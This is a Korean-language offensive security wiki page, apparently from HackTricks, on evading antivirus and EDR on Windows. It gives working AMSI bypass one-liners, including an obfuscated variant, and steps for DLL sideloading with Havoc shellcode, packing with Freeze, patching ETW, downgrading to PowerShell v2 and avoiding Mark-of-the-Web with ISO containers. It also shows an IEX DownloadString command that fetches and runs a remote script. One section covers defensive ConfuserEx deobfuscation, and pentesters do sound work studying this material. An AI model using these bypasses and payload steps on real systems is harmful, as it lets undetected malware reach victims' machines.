# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**에 의해 작성되었습니다!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender의 작동을 중지시키는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender의 작동을 중지시키는 도구입니다.
- [관리자라면 Defender 비활성화](basic-powershell-for-pentesters/README.md)

## **AV 회피 방법론**

현재 AV는 파일이 악성인지 여부를 확인하기 위해 정적 탐지, 동적 분석 및 더 고급 EDR의 경우 행동 분석과 같은 다양한 방법을 사용합니다.

### **정적 탐지**

정적 탐지는 이진 파일이나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 플래그 지정하고, 파일 자체에서 정보를 추출하여 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 이는 알려진 공개 도구를 사용하면 더 쉽게 적발될 수 있음을 의미합니다. 왜냐하면 이러한 도구는 아마도 분석되어 악성으로 플래그가 지정되었기 때문입니다. 이러한 종류의 탐지를 우회하는 몇 가지 방법이 있습니다:

- **암호화**

이진 파일을 암호화하면 AV가 프로그램을 탐지할 방법이 없지만, 메모리에서 프로그램을 복호화하고 실행할 로더가 필요합니다.

- **난독화**

때때로 이진 파일이나 스크립트의 일부 문자열을 변경하는 것만으로 AV를 우회할 수 있지만, 이는 난독화하려는 내용에 따라 시간이 많이 소요될 수 있습니다.

- **커스텀 도구**

자신만의 도구를 개발하면 알려진 악성 서명이 없지만, 이는 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지에 대한 좋은 확인 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나눈 다음 Defender에게 각 세그먼트를 개별적으로 스캔하도록 요청합니다. 이렇게 하면 이진 파일에서 플래그가 지정된 문자열이나 바이트를 정확히 알 수 있습니다.

이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)을 확인하는 것을 강력히 추천합니다. 실용적인 AV 회피에 대한 내용입니다.

### **동적 분석**

동적 분석은 AV가 이진 파일을 샌드박스에서 실행하고 악성 활동을 감시하는 것입니다(예: 브라우저의 비밀번호를 복호화하고 읽으려 하거나, LSASS에서 미니 덤프를 수행하는 등). 이 부분은 다루기가 조금 더 까다로울 수 있지만, 샌드박스를 우회하기 위해 할 수 있는 몇 가지 방법이 있습니다.

- **실행 전 대기** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧기 때문에 긴 대기를 사용하면 이진 파일 분석을 방해할 수 있습니다. 문제는 많은 AV의 샌드박스가 구현 방식에 따라 대기를 건너뛸 수 있다는 것입니다.
- **기계의 자원 확인** 일반적으로 샌드박스는 작업할 수 있는 자원이 매우 적습니다(예: < 2GB RAM), 그렇지 않으면 사용자의 기계를 느리게 만들 수 있습니다. 여기서 매우 창의적으로 접근할 수 있습니다. 예를 들어 CPU의 온도나 팬 속도를 확인하는 것과 같이 샌드박스에 구현되지 않은 것들이 많습니다.
- **기계 특정 검사** "contoso.local" 도메인에 가입된 사용자를 타겟으로 하려면, 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료하도록 할 수 있습니다.

Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH입니다. 따라서 폭발 전에 악성코드에서 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender의 샌드박스 안에 있다는 의미이므로 프로그램을 종료할 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스에 대항하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 유용한 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>

이 게시물에서 이전에 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:

예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야 하나요**? 아니면 덜 알려진 다른 프로젝트를 사용하여 LSASS를 덤프할 수 있을까요?

정답은 아마 후자일 것입니다. mimikatz를 예로 들면, 아마도 AV와 EDR에 의해 가장 많이 플래그가 지정된 악성코드 중 하나일 것입니다. 프로젝트 자체는 매우 멋지지만, AV를 우회하기 위해 작업하는 것은 악몽이 될 수 있으므로, 달성하려는 목표에 대한 대안을 찾아보세요.

> [!TIP]
> 회피를 위해 페이로드를 수정할 때는 Defender에서 **자동 샘플 제출을 끄는 것**을 잊지 마세요. 그리고 제발, **VIRUSTOTAL에 업로드하지 마세요**. 장기적으로 회피를 달성하는 것이 목표라면 말입니다. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면 VM에 설치하고 자동 샘플 제출을 끄고, 결과에 만족할 때까지 테스트하세요.

## EXE vs DLL

가능할 때마다 **회피를 위해 DLL 사용을 우선시하세요**. 제 경험상 DLL 파일은 일반적으로 **탐지 및 분석이 훨씬 덜** 되므로, 경우에 따라 탐지를 피하기 위한 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).

이 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 보이는 반면, EXE 페이로드는 7/26의 탐지율을 보입니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE 페이로드와 일반 Havoc DLL의 비교</p></figcaption></figure>

이제 DLL 파일을 사용하여 훨씬 더 은밀하게 작업할 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL 사이드로딩 및 프록시

**DLL 사이드로딩**은 로더가 사용하는 DLL 검색 순서를 이용하여 피해자 애플리케이션과 악성 페이로드를 나란히 배치하는 것입니다.

DLL 사이드로딩에 취약한 프로그램을 확인하려면 [Siofra](https://github.com/Cybereason/siofra)와 다음 PowerShell 스크립트를 사용할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내에서 DLL 하이재킹에 취약한 프로그램 목록과 그들이 로드하려고 하는 DLL 파일을 출력합니다.

저는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색할 것을 강력히 권장합니다**. 이 기술은 제대로 수행하면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 발각될 수 있습니다.

악성 DLL을 프로그램이 로드할 것으로 예상하는 이름으로 배치하는 것만으로는 페이로드가 로드되지 않습니다. 프로그램은 해당 DLL 내에서 특정 기능을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL 프록시/포워딩**이라는 또 다른 기술을 사용할 것입니다.

**DLL 프록시**는 프로그램이 프록시(및 악성) DLL에서 원래 DLL로 호출을 전달하여 프로그램의 기능을 유지하고 페이로드 실행을 처리할 수 있게 합니다.

저는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

제가 따랐던 단계는 다음과 같습니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL입니다.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 쉘코드( [SGN](https://github.com/EgeBalci/sgn)으로 인코딩됨)와 프록시 DLL 모두 [antiscan.me](https://antiscan.me)에서 0/26 탐지율을 기록했습니다! 나는 이것을 성공이라고 부를 수 있습니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 나는 당신이 [S3cur3Th1sSh1t의 트위치 VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청할 것을 **강력히 추천**합니다. 우리가 논의한 내용을 더 깊이 배우기 위해서입니다.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 중단된 프로세스, 직접 시스템 호출 및 대체 실행 방법을 사용하여 EDR을 우회하기 위한 페이로드 툴킷입니다.`

Freeze를 사용하여 은밀한 방식으로 쉘코드를 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단순한 고양이와 쥐의 게임입니다. 오늘 작동하는 것이 내일 감지될 수 있으므로, 가능하다면 하나의 도구에만 의존하지 말고 여러 회피 기술을 연결해 보세요.

## AMSI (안티 맬웨어 스캔 인터페이스)

AMSI는 "[파일리스 맬웨어](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 처음에 AV는 **디스크의 파일**만 스캔할 수 있었기 때문에, 만약 어떤 방법으로든 페이로드를 **메모리에서 직접 실행**할 수 있다면, AV는 이를 방지할 수 있는 충분한 가시성이 없었습니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

- 사용자 계정 컨트롤, 또는 UAC (EXE, COM, MSI 또는 ActiveX 설치의 상승)
- PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
- Windows 스크립트 호스트 (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

이는 안티바이러스 솔루션이 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있도록 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

스크립트가 실행된 실행 파일의 경로 앞에 `amsi:`가 붙는 것을 주목하세요. 이 경우, powershell.exe입니다.

우리는 디스크에 파일을 생성하지 않았지만, 여전히 AMSI 때문에 메모리에서 잡혔습니다.

게다가, **.NET 4.8**부터 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 사용하여 메모리 실행에 영향을 미칩니다. 따라서 AMSI를 회피하고 싶다면 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다:

- **난독화**

AMSI는 주로 정적 감지와 함께 작동하므로, 로드하려는 스크립트를 수정하는 것이 감지를 회피하는 좋은 방법이 될 수 있습니다.

그러나 AMSI는 여러 레이어가 있더라도 스크립트를 난독화 해제할 수 있는 기능이 있으므로, 난독화가 어떻게 이루어졌는지에 따라 나쁜 선택이 될 수 있습니다. 이는 회피를 간단하지 않게 만듭니다. 하지만 때때로, 변수 이름 몇 개만 변경하면 괜찮아지므로, 얼마나 많은 것이 플래그가 되었는지에 따라 다릅니다.

- **AMSI 우회**

AMSI는 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되므로, 비특권 사용자로 실행하더라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함으로 인해 연구자들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.

**오류 강제 발생**

AMSI 초기화를 실패하게 강제하면(amsiInitFailed) 현재 프로세스에 대한 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 더 넓은 사용을 방지하기 위해 서명을 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
단 한 줄의 PowerShell 코드로 현재 PowerShell 프로세스에서 AMSI를 사용할 수 없게 만들 수 있었습니다. 이 줄은 물론 AMSI 자체에 의해 플래그가 지정되었으므로 이 기술을 사용하기 위해서는 약간의 수정이 필요합니다.

여기에서 제가 가져온 수정된 AMSI 우회 방법이 있습니다 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 처음 발견되었으며, amsi.dll에서 "AmsiScanBuffer" 함수의 주소를 찾아 사용자 제공 입력을 스캔하는 책임이 있는 이 함수를 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔의 결과가 0으로 반환되어 깨끗한 결과로 해석됩니다.

> [!TIP]
> 더 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.

PowerShell을 사용하여 AMSI를 우회하는 데 사용되는 다른 많은 기술도 있으며, [**이 페이지**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**이 레포**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 알아보세요.

이 도구 [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail)도 AMSI를 우회하는 스크립트를 생성합니다.

**Remove the detected signature**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**와 같은 도구를 사용하여 현재 프로세스의 메모리에서 감지된 AMSI 서명을 제거할 수 있습니다. 이 도구는 현재 프로세스의 메모리를 스캔하여 AMSI 서명을 찾고, 이를 NOP 명령어로 덮어써서 메모리에서 효과적으로 제거합니다.

**AV/EDR products that uses AMSI**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**Use Powershell version 2**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 의해 스캔되지 않고 스크립트를 실행할 수 있습니다. 이렇게 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell 로깅은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 이는 감사 및 문제 해결 목적으로 유용할 수 있지만, **탐지를 피하고자 하는 공격자에게는 문제가 될 수 있습니다**.

PowerShell 로깅을 우회하려면 다음 기술을 사용할 수 있습니다:

- **PowerShell 전사 및 모듈 로깅 비활성화**: 이를 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)와 같은 도구를 사용할 수 있습니다.
- **PowerShell 버전 2 사용**: PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 의해 스캔되지 않고 스크립트를 실행할 수 있습니다. 이렇게 할 수 있습니다: `powershell.exe -version 2`
- **비관리 Powershell 세션 사용**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)를 사용하여 방어가 없는 powershell을 생성합니다 (이것은 Cobalt Strike의 `powerpick`가 사용하는 것입니다).

## Obfuscation

> [!TIP]
> 여러 가지 난독화 기술은 데이터를 암호화하는 데 의존하며, 이는 이진 파일의 엔트로피를 증가시켜 AV 및 EDR이 이를 감지하기 쉽게 만듭니다. 이에 주의하고, 민감하거나 숨겨야 할 코드의 특정 섹션에만 암호화를 적용하는 것이 좋습니다.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상업적 포크)를 사용하는 악성 코드를 분석할 때, 디컴파일러와 샌드박스를 차단하는 여러 보호 계층에 직면하는 것이 일반적입니다. 아래의 워크플로우는 **거의 원본 IL을 복원**하여 이후 dnSpy 또는 ILSpy와 같은 도구에서 C#으로 디컴파일할 수 있습니다.

1.  안티탐퍼 제거 – ConfuserEx는 모든 *메서드 본문*을 암호화하고 *모듈* 정적 생성자(`<Module>.cctor`) 내에서 복호화합니다. 이는 PE 체크섬도 패치하므로 수정 시 이진 파일이 충돌합니다. **AntiTamperKiller**를 사용하여 암호화된 메타데이터 테이블을 찾고, XOR 키를 복구하고, 깨끗한 어셈블리를 다시 작성합니다:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자신의 언팩커를 구축할 때 유용할 수 있는 6개의 안티탐퍼 매개변수(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  기호 / 제어 흐름 복구 – *깨끗한* 파일을 **de4dot-cex**(ConfuserEx 인식 de4dot 포크)에 제공합니다.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
플래그:
• `-p crx` – ConfuserEx 2 프로필 선택
• de4dot는 제어 흐름 평탄화를 취소하고, 원래의 네임스페이스, 클래스 및 변수 이름을 복원하며, 상수 문자열을 복호화합니다.

3.  프록시 호출 제거 – ConfuserEx는 직접 메서드 호출을 경량 래퍼(즉, *프록시 호출*)로 대체하여 디컴파일을 더욱 방해합니다. **ProxyCall-Remover**를 사용하여 이를 제거합니다:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수(`Class8.smethod_10` 등) 대신 `Convert.FromBase64String` 또는 `AES.Create()`와 같은 정상적인 .NET API를 관찰해야 합니다.

4.  수동 정리 – dnSpy에서 결과 이진 파일을 실행하고, 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드를 찾습니다. 종종 악성 코드는 `<Module>.byte_0` 내에서 초기화된 TLV 인코딩 바이트 배열로 저장합니다.

위의 체인은 악성 샘플을 실행할 필요 없이 실행 흐름을 복원합니다 – 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 사용자 정의 속성을 생성하며, 이는 IOC로 사용되어 샘플을 자동으로 분류하는 데 사용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화 도구**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일러 스위트의 오픈 소스 포크를 제공하여 [코드 난독화](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 변조 방지를 통해 소프트웨어 보안을 강화하는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 외부 도구를 사용하지 않고 컴파일 시간에 난독화된 코드를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크에 의해 생성된 난독화된 작업의 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 삶을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 다양한 pe 파일(.exe, .dll, .sys 포함)을 난독화할 수 있는 x64 바이너리 난독화 도구입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의의 실행 파일을 위한 간단한 변형 코드 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(리턴 지향 프로그래밍)를 사용하는 LLVM 지원 언어를 위한 세밀한 코드 난독화 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환하여 프로그램을 어셈블리 코드 수준에서 난독화하여 정상적인 제어 흐름에 대한 우리의 자연스러운 개념을 저해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE 암호화 도구입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 쉘코드로 변환한 다음 이를 로드할 수 있습니다.

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드하고 실행할 때 이 화면을 보았을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성 애플리케이션 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식을 사용하여 작동하며, 이는 일반적으로 다운로드되지 않는 애플리케이션이 SmartScreen을 트리거하여 최종 사용자가 파일을 실행하지 못하도록 경고하고 방지한다는 것을 의미합니다(파일은 여전히 More Info -> Run anyway를 클릭하여 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 [NTFS 대체 데이터 스트림](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 자동으로 생성되며, 다운로드한 URL과 함께 Zone.Identifier라는 이름을 가집니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> **신뢰할 수 있는** 서명 인증서로 서명된 실행 파일은 **SmartScreen을 트리거하지 않습니다**.

페이로드가 Mark of The Web을 받지 않도록 방지하는 매우 효과적인 방법은 ISO와 같은 어떤 형태의 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW) **가** **비 NTFS** 볼륨에 적용될 수 없기 때문에 발생합니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 피하기 위해 페이로드를 출력 컨테이너에 패키징하는 도구입니다.

예제 사용법:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 애플리케이션과 시스템 구성 요소가 **이벤트를 기록**할 수 있게 해주는 Windows의 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악의적인 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수가 이벤트를 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이는 메모리에서 함수를 패치하여 즉시 반환하게 하여 해당 프로세스의 ETW 로깅을 효과적으로 비활성화하는 방식으로 이루어집니다.

자세한 정보는 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 및 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.


## C# Assembly Reflection

C# 바이너리를 메모리에 로드하는 것은 꽤 오랫동안 알려져 있으며, AV에 걸리지 않고 포스트 익스플로잇 도구를 실행하는 매우 좋은 방법입니다.

페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 전체 프로세스에 대해 AMSI를 패치하는 것만 걱정하면 됩니다.

대부분의 C2 프레임워크(슬리버, 코버넌트, 메타스플로잇, 코발트스트라이크, 하복 등)는 이미 메모리에서 C# 어셈블리를 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입하여 악성 코드를 실행한 후, 완료되면 새로운 프로세스를 종료하는 방식입니다. 이 방법은 장점과 단점이 모두 있습니다. Fork and run 방법의 장점은 실행이 **우리의 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 잡히더라도 **임플란트가 생존할 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 잡힐 가능성이 **더 높아진다는** 것입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는** 것입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행 중 문제가 발생하면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# 어셈블리 로딩에 대해 더 읽고 싶다면, 이 기사를 확인해 보세요 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

또한 C# 어셈블리를 **PowerShell에서 로드할 수** 있으며, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 및 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안된 바와 같이, 손상된 머신에 **공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 대한 접근을 제공함으로써** 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.

인터프리터 바이너리와 SMB 공유의 환경에 대한 접근을 허용함으로써, 손상된 머신의 메모리 내에서 **이 언어들로 임의의 코드를 실행할 수 있습니다.**

레포에서는 다음과 같이 언급합니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용함으로써 **정적 서명을 우회할 수 있는 더 많은 유연성을 제공합니다.** 이러한 언어로 무작위로 난독화되지 않은 리버스 쉘 스크립트로 테스트한 결과 성공적이었습니다.

## TokenStomping

Token stomping은 공격자가 **액세스 토큰이나 EDR 또는 AV와 같은 보안 제품을 조작**하여 프로세스가 종료되지 않도록 하면서 악성 활동을 확인할 권한을 줄이는 기술입니다.

이를 방지하기 위해 Windows는 **외부 프로세스가** 보안 프로세스의 토큰에 대한 핸들을 얻는 것을 **방지할 수 있습니다.**

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**이 블로그 포스트**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에서 설명된 바와 같이, 피해자의 PC에 Chrome Remote Desktop을 배포한 후 이를 사용하여 장악하고 지속성을 유지하는 것은 쉽습니다:
1. https://remotedesktop.google.com/에서 다운로드하고 "SSH를 통해 설정"을 클릭한 후, Windows용 MSI 파일을 다운로드합니다.
